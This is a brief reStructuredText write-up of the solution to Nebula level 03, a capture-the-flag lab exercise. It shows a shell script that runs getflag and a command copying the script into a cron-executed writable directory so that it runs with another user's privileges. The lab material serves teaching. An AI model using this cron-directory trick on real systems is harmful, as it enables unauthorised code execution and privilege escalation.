.. _nebula03:

.. role(code)
   :language: bash

Nebula 3
========

Basic Information
-----------------

**Home Page** https://exploit-exercises.com/nebula/level03/

Solution
--------

Create an script with this:
.. code-block:: bash

   #!/bin/sh

   /bin/getflag >> /tmp/flag03.out
   $ cp getflag.sh /home/flag03/writable.d/

.. note::

   You have to wait until cron gets executed or execute the program given
